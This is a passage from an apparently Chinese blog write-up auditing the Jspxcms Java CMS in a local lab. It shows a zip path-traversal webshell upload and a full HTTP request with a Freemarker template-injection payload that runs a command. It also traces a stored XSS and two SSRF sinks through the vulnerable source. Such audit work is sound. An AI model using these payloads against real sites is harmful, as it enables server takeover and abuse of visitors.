+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zipinfo evilzip.<span class="property">zip</span></span><br><span class="line"><span class="title class_">Archive</span>:  evilzip.<span class="property">zip</span></span><br><span class="line"><span class="title class_">Zip</span> file <span class="attr">size</span>: <span class="number">561</span> bytes, number <span class="keyword">of</span> <span class="attr">entries</span>: <span class="number">2</span></span><br><span class="line">drwxr-xr-x  <span class="number">2.0</span> unx        <span class="number">0</span> bx stor <span class="number">22</span>-<span class="title class_">Mar</span>-<span class="number">16</span> <span class="number">13</span>:<span class="number">13</span> /</span><br><span class="line">-rw-r--r--  <span class="number">2.0</span> unx      <span class="number">604</span> bX defN <span class="number">22</span>-<span class="title class_">Mar</span>-<span class="number">16</span> <span class="number">13</span>:<span class="number">14</span> ../../rce.<span class="property">jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>然后上传，但是依旧是无法访问，可以发现在访问jsp后缀的文件时，会在前面加一个&#x2F;jsp前缀。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/7.png"></p>
+<p>回到IDAE中，发现相关过滤器如下。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/8.png"></p>
+<p>既然如此，那么尝试将jsp转成war，这样的目的是作为一个独立的web应用，就不会过如上过滤器了。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar -cf rce.<span class="property">war</span> ./rce.<span class="property">jsp</span></span><br></pre></td></tr></table></figure>
+
+<p>然后再此上传，由于此次的环境是通过IDEA启动SpringBoot的，所以在这种情况下是依旧无法访问webshell的。但在实际tomcat部署方式中，这种方式肯定是可行的。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/9.png"></p>
+<h3 id="Freemarker-SSTI"><a href="#Freemarker-SSTI" class="headerlink" title="Freemarker SSTI"></a>Freemarker SSTI</h3><p>继续翻看后台相关功能，发现一个模版上传的功能，由于该应用使用的是Freemarker模板框架，所以此处可能存在模版注入漏洞的。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/10.png"></p>
+<p>上传一个恶意的模版。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /cmscp/core/web_file_1/upload.<span class="property">do</span>?_site=<span class="number">1</span> <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8088</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">496</span></span><br><span class="line"><span class="title class_">Accept</span>: text/html, *<span class="comment">/*; q=0.01</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAZrBHSAhmC9xfoEi</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: en-US,en;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: open_ids=%2F1%2C%2F1%2Fdefault; select_id=%2F1%2Fm; OFBiz.Visitor=10000; _jspxcms=f1bcdbbcf4bb4413a5630543db361cd4; _site=1; JSESSIONID=1F497CF9E044E65C2DBAAE4ADAF1B2D7</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryAZrBHSAhmC9xfoEi</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;parentId&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">/1/rce</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryAZrBHSAhmC9xfoEi</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;index.html&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/html</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[#escape a as (a)!?html]</span></span><br><span class="line"><span class="comment">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="comment">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;head&gt;</span></span><br><span class="line"><span class="comment">&lt;meta charset=&quot;utf-8&quot;/&gt;</span></span><br><span class="line"><span class="comment">&lt;/head&gt;</span></span><br><span class="line"><span class="comment">&lt;body&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;open -a Calculator&quot;)&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;/body&gt;</span></span><br><span class="line"><span class="comment">&lt;/html&gt;</span></span><br><span class="line"><span class="comment">[/#escape]</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryAZrBHSAhmC9xfoEi--</span></span><br></pre></td></tr></table></figure>
+
+<p>回到IDEA中搜索相关功能点，相关处理方法如下，没有经过任意安全检查便直接写入了。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">void</span> <span class="title function_">upload</span>(<span class="title class_">MultipartFile</span> file, <span class="title class_">String</span> parentId, <span class="title class_">HttpServletRequest</span> request, <span class="title class_">HttpServletResponse</span> response)</span><br><span class="line">		throws <span class="title class_">IllegalStateException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line">	<span class="title class_">Site</span> site = <span class="title class_">Context</span>.<span class="title function_">getCurrentSite</span>();</span><br><span class="line">	<span class="comment">// parentId = parentId == null ? base : parentId;</span></span><br><span class="line">	<span class="title class_">String</span> base = <span class="title function_">getBase</span>(site);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="title class_">Validations</span>.<span class="title function_">uri</span>(parentId, base)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CmsException</span>(<span class="string">&quot;invalidURI&quot;</span>, parentId);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title class_">FileHandler</span> fileHandler = <span class="title function_">getFileHandler</span>(site);</span><br><span class="line">	fileHandler.<span class="title function_">store</span>(file, parentId);</span><br><span class="line">	logService.<span class="title function_">operation</span>(<span class="string">&quot;opr.webFile.upload&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>(), <span class="literal">null</span>, <span class="literal">null</span>, request);</span><br><span class="line">	logger.<span class="title function_">info</span>(<span class="string">&quot;upload file, name=&#123;&#125;.&quot;</span>, parentId + <span class="string">&quot;/&quot;</span> + file.<span class="title function_">getOriginalFilename</span>());</span><br><span class="line">	<span class="title class_">Servlets</span>.<span class="title function_">writeHtml</span>(response, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在成功上传后，然后去到系统管理-网站设置中，修改模板主题为刚刚上传的恶意模板。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/11.png"></p>
+<p>最后进行访问便可以触发命令执行。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/12.png"></p>
+<h2 id="0x05-XSS"><a href="#0x05-XSS" class="headerlink" title="0x05 XSS"></a>0x05 XSS</h2><p>寻找到一处评论框，尝试注入XSS弹窗payload，并使用Burpsuite拦截请求。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/13.png"></p>
+<p>通过HTTP报文得知，评论内容的参数为<code>text</code>。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/14.png"></p>
+<p>IDEA中搜索<code>comment_submit</code>路由，找到处理逻辑。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/15.png"></p>
+<p>处理方法如下，<code>submit</code>方法未对text做任何检查过滤，直接传入<code>submit</code>的重载方法中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/comment_submit&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">submit</span><span class="params">(String fname, String ftype, Integer fid,</span></span><br><span class="line"><span class="params">		Integer parentId, String text, String captcha,</span></span><br><span class="line"><span class="params">		HttpServletRequest request, HttpServletResponse response,</span></span><br><span class="line"><span class="params">		org.springframework.ui.Model modelMap)</span></span><br><span class="line">		<span class="keyword">throws</span> InstantiationException, IllegalAccessException,</span><br><span class="line">		ClassNotFoundException &#123;</span><br><span class="line">	<span class="keyword">return</span> submit(<span class="literal">null</span>, fname, ftype, fid, parentId, text, captcha,</span><br><span class="line">			request, response, modelMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进重载方法中，在其中也是对<code>text</code>变量进行了非空判断和去敏感词。然后将<code>text</code>变量的值赋给comment对象中的<code>text</code>变量。最后到205行的由<code>CommentService.save</code>接口实现的<code>service.save</code>方法调用comment实例。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/16.png"></p>
+<p>接口<code>CommentService</code>的实现类为<code>CommentServiceImpl</code>，继续跟进其中的<code>save</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Comment <span class="title function_">save</span><span class="params">(Comment bean, Integer userId, Integer siteId, Integer parentId)</span> &#123;</span><br><span class="line">	<span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> siteService.get(siteId);</span><br><span class="line">	bean.setSite(site);</span><br><span class="line">	<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.get(userId);</span><br><span class="line">	bean.setCreator(user);</span><br><span class="line">	<span class="keyword">if</span> (parentId != <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="type">Comment</span> <span class="variable">parent</span> <span class="operator">=</span> get(parentId);</span><br><span class="line">		bean.setParent(parent);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (StringUtils.isNotBlank(bean.getIp())) &#123;</span><br><span class="line">		bean.setCountry(ipSeeker.getCountry(bean.getIp()));</span><br><span class="line">		bean.setArea(ipSeeker.getArea(bean.getIp()));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bean.applyDefaultValue();</span><br><span class="line">	bean = dao.save(bean);</span><br><span class="line">	dao.flushAndRefresh(bean);</span><br><span class="line">	<span class="keyword">if</span> (bean.getStatus() == Comment.AUDITED) &#123;</span><br><span class="line">		<span class="type">Object</span> <span class="variable">anchor</span> <span class="operator">=</span> bean.getAnchor();</span><br><span class="line">		<span class="keyword">if</span> (anchor <span class="keyword">instanceof</span> Commentable) &#123;</span><br><span class="line">			((Commentable) anchor).addComments(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该方法中，也未对<code>bean</code>做任何安全处理，最终通过<code>dao.save</code>方法保存至数据库。但最后在页面上却没有触发XSS弹窗。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/17.png"></p>
+<p>同时，通过抓包发现，处理评论的是<code>comment_list</code>路由，并且payload被转义。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/18.png"></p>
+<p>回到IDEA查看处理<code>comment_list</code>路由的方法，如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/comment_list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">list</span><span class="params">(String ftype, Integer fid, Integer page,</span></span><br><span class="line"><span class="params">		HttpServletRequest request, org.springframework.ui.Model modelMap)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> list(<span class="literal">null</span>, ftype, fid, page, request, modelMap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(Constants.SITE_PREFIX_PATH + &quot;/comment_list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">list</span><span class="params">(<span class="meta">@PathVariable</span> String siteNumber, String ftype,</span></span><br><span class="line"><span class="params">		Integer fid, Integer page, HttpServletRequest request,</span></span><br><span class="line"><span class="params">		org.springframework.ui.Model modelMap)</span> &#123;</span><br><span class="line">	siteResolver.resolveSite(siteNumber);</span><br><span class="line">	<span class="type">Site</span> <span class="variable">site</span> <span class="operator">=</span> Context.getCurrentSite();</span><br><span class="line">	<span class="keyword">if</span> (StringUtils.isBlank(ftype)) &#123;</span><br><span class="line">		ftype = <span class="string">&quot;Info&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (fid == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="comment">// TODO</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> service.getEntity(ftype, fid);</span><br><span class="line">	<span class="keyword">if</span> (bean == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="comment">// TODO</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">Anchor</span> <span class="variable">anchor</span> <span class="operator">=</span> (Anchor) bean;</span><br><span class="line">	<span class="comment">// Site site = ((Siteable) bean).getSite();</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">tpl</span> <span class="operator">=</span> Servlets.getParam(request, <span class="string">&quot;tpl&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (StringUtils.isBlank(tpl)) &#123;</span><br><span class="line">		tpl = <span class="string">&quot;_list&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	modelMap.addAttribute(<span class="string">&quot;anchor&quot;</span>, anchor);</span><br><span class="line">	Map&lt;String, Object&gt; data = modelMap.asMap();</span><br><span class="line">	ForeContext.setData(data, request);</span><br><span class="line">	ForeContext.setPage(data, page);</span><br><span class="line">	<span class="keyword">return</span> site.getTemplate(TPL_PREFIX + tpl + TPL_SUFFIX);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>list</code>方法的最后，将<code>sys_comment_list.html</code>传入<code>site.getTemplate</code>方法中。</p>
+<p>而在<code>sys_comment_list.html</code>中有使用到Freemarker模版引擎中的转义。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[#escape x as (x)!?html]</span><br><span class="line">[#assign commentIndex = 1/]</span><br><span class="line">[#macro printComment parent]</span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#FFE;border:1px solid #999;padding:3px;&quot;</span>&gt;</span></span><br><span class="line">		[#if parent.parent??]</span><br><span class="line">...</span><br><span class="line">[/#if]</span><br><span class="line">[/#escape]</span><br></pre></td></tr></table></figure>
+
+<p>在同级目录下排查不包含转义的html文件，结果如下，确定一个与评论有关的html，即<code>sys_member_space_comment.html</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">grep -L <span class="string">&quot;/#escape&quot;</span> *.html                                                                                                                                                                                                                                  130</span><br><span class="line">app_info_favorites.html</span><br><span class="line">app_notification.html</span><br><span class="line">inc_js.html</span><br><span class="line">list.html</span><br><span class="line">page.html</span><br><span class="line">sys_member_login_ajax.html</span><br><span class="line">sys_member_space_article.html</span><br><span class="line">sys_member_space_comment.html</span><br><span class="line">sys_operation_error.html</span><br><span class="line">sys_operation_success.html</span><br><span class="line">sys_operation_warning.html</span><br><span class="line">sys_rss.html</span><br></pre></td></tr></table></figure>
+
+<p>而在<code>sys_member_space.html</code>中又对<code>sys_member_space_comment.html</code>进行了包含，需要当type请求参数的值为comment或article。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/19.png"></p>
+<p>继续在IDEA中搜索<code>sys_member_space.html</code>，发现当请求路径为<code>/space/&#123;id&#125;</code>，就会获取<code>sys_member_space.html</code>模版，最终成功执行存储性XSS。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/20.png"></p>
+<p><img src="/img/post/jspxcms-code-audit-learn/21.png"></p>
+<h2 id="0x06-SSRF"><a href="#0x06-SSRF" class="headerlink" title="0x06 SSRF"></a>0x06 SSRF</h2><p>在审计SSRF漏洞前，需要知道Java中的一些常见的对外发送请求的方法。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Socket()</span><br><span class="line">OkHttpClient.newCall(request).execute()</span><br><span class="line">ImageIO.read()</span><br><span class="line">HttpClient.execute()</span><br><span class="line">HttpClient.executeMethod()</span><br><span class="line">HttpURLConnection.connect()</span><br><span class="line">HttpURLConnection.getInputStream()</span><br><span class="line">URL.openConnection()</span><br><span class="line">URL.openStream()</span><br><span class="line">HttpServletRequest()</span><br><span class="line">BasicHttpEntityEnclosingRequest()</span><br><span class="line">DefaultBHttpClientConnection()</span><br><span class="line">BasicHttpRequest()</span><br></pre></td></tr></table></figure>
+
+<h3 id="HttpClient-execute"><a href="#HttpClient-execute" class="headerlink" title="HttpClient.execute()"></a>HttpClient.execute()</h3><p>在IDEA中直接搜索到<code>httpclient.execute</code>方法，这个方法实现自HttpClient类，发现有个获取HTML网页的方法。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/22.png"></p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Transient</span></span><br><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">fetchHtml</span>(<span class="title class_">CloseableHttpClient</span> httpclient, <span class="variable constant_">URI</span> uri,</span><br><span class="line">		<span class="title class_">String</span> charset) throws <span class="title class_">ClientProtocolException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line">	<span class="title class_">HttpGet</span> httpget = <span class="keyword">new</span> <span class="title class_">HttpGet</span>(uri);</span><br><span class="line">	<span class="title class_">CloseableHttpResponse</span> response = httpclient.<span class="title function_">execute</span>(httpget);</span><br><span class="line">	<span class="title class_">String</span> html = <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (response.<span class="title function_">getStatusLine</span>().<span class="title function_">getStatusCode</span>() == <span class="title class_">HttpServletResponse</span>.<span class="property">SC_OK</span>) &#123;</span><br><span class="line">			<span class="title class_">HttpEntity</span> entity = response.<span class="title function_">getEntity</span>();</span><br><span class="line">			html = <span class="title class_">EntityUtils</span>.<span class="title function_">toString</span>(entity, charset);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">		response.<span class="title function_">close</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该方法有被重载方法调用。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title class_">Transient</span></span><br><span class="line">public <span class="keyword">static</span> <span class="title class_">String</span> <span class="title function_">fetchHtml</span>(<span class="variable constant_">URI</span> uri, <span class="title class_">String</span> charset, <span class="title class_">String</span> userAgent)</span><br><span class="line">		throws <span class="title class_">ClientProtocolException</span>, <span class="title class_">IOException</span> &#123;</span><br><span class="line">	<span class="title class_">CloseableHttpClient</span> httpclient = <span class="title class_">HttpClients</span>.<span class="title function_">custom</span>()</span><br><span class="line">			.<span class="title function_">setUserAgent</span>(userAgent).<span class="title function_">build</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">fetchHtml</span>(httpclient, uri, charset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查询该方法有被哪些方法调用，发现一个方法，在其中没有任何安全检查。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/23.png"></p>
+<p>直接尝试构造请求，结果如下，成功对本地发起SSRF。</p>
+<p><img src="/img/post/jspxcms-code-audit-learn/24.png"></p>
+<h3 id="URL-openConnection"><a href="#URL-openConnection" class="headerlink" title="URL.openConnection()"></a>URL.openConnection()</h3><p>继续搜索相关请求方法，发现存在<code>openConnection</code>方法，在如下<code>ueditorCatchImage</code>方法中。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">void</span> <span class="title function_">ueditorCatchImage</span>(<span class="title class_">Site</span> site, <span class="title class_">HttpServletRequest</span> request,</span><br><span class="line">                                 <span class="title class_">HttpServletResponse</span> response) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">    <span class="title class_">GlobalUpload</span> gu = site.<span class="title function_">getGlobal</span>().<span class="title function_">getUpload</span>();</span><br><span class="line">    <span class="title class_">PublishPoint</span> point = site.<span class="title function_">getUploadsPublishPoint</span>();</span><br><span class="line">    <span class="title class_">FileHandler</span> fileHandler = point.<span class="title function_">getFileHandler</span>(pathResolver);</span><br><span class="line">    <span class="title class_">String</span> urlPrefix = point.<span class="title function_">getUrlPrefix</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title class_">StringBuilder</span> result = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&#123;\&quot;state\&quot;: \&quot;SUCCESS\&quot;, list: [&quot;</span>);</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">String</span>&gt; urls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;<span class="title class_">String</span>&gt;();</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">String</span>&gt; srcs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;<span class="title class_">String</span>&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="title class_">String</span>[] source = request.<span class="title function_">getParameterValues</span>(<span class="string">&quot;source[]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        source = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; source.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="title class_">String</span> src = source[i];</span><br><span class="line">        <span class="title class_">String</span> extension = <span class="title class_">FilenameUtils</span>.<span class="title function_">getExtension</span>(src);</span><br><span class="line">        <span class="comment">// 格式验证</span></span><br><span class="line">        <span class="keyword">if</span> (!gu.<span class="title function_">isExtensionValid</span>(extension, <span class="title class_">Uploader</span>.<span class="property">IMAGE</span>)) &#123;</span><br><span class="line">            <span class="comment">// state = &quot;Extension Invalid&quot;;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">HttpURLConnection</span>.<span class="title function_">setFollowRedirects</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="title class_">HttpURLConnection</span> conn = (<span class="title class_">HttpURLConnection</span>) <span class="keyword">new</span> <span class="title function_">URL</span>(src).<span class="title function_">openConnection</span>();</span><br><span class="line">        <span class="keyword">if</span> (conn.<span class="title function_">getContentType</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;image&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// state = &quot;ContentType Invalid&quot;;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (conn.<span class="title function_">getResponseCode</span>() != <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// state = &quot;Request Error&quot;;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">String</span> pathname = site.<span class="title function_">getSiteBase</span>(<span class="title class_">Uploader</span>.<span class="title function_">getQuickPathname</span>(<span class="title class_">Uploader</span>.<span class="property">IMAGE</span>, extension));</span><br><span class="line">        <span class="title class_">InputStream</span> is = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = conn.<span class="title function_">getInputStream</span>();</span><br><span class="line">            fileHandler.<span class="title function_">storeFile</span>(is, pathname);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title class_">IOUtils</span>.<span class="title function_">closeQuietly</span>(is);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">String</span> url = urlPrefix + pathname;</span><br><span class="line">        urls.<span class="title function_">add</span>(url);</span><br><span class="line">        srcs.<span class="title function_">add</span>(src);</span><br><span class="line">        result.<span class="title function_">append</span>(<span class="string">&quot;&#123;\&quot;state\&quot;: \&quot;SUCCESS\&quot;,&quot;</span>);</span><br><span class="line">  